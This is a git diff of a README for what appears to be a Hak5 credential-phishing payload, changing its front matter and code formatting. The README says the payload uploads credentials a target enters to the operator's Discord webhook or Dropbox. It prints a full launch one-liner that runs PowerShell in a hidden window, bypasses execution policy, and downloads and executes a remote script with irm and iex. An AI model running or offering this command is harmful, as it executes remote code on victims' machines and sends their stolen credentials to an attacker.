@@ -1,3 +1,5 @@
+---
+---
 ![Logo](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/Assets/logo-170-px.png?raw=true)
 
 <!-- TABLE OF CONTENTS -->
@@ -46,9 +48,9 @@ Once the target enters their credentials their information will be uploaded to y
 * <code>$dc</code> is the variable that holds your Discord webhook 
 * Fill in either variable or both to set your exfil method
 
-```
+<pre><code>
 powershell -w h -ep bypass $dc='';$db='';irm https://jakoby.lol/35k | iex
-```
+</code></pre>
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
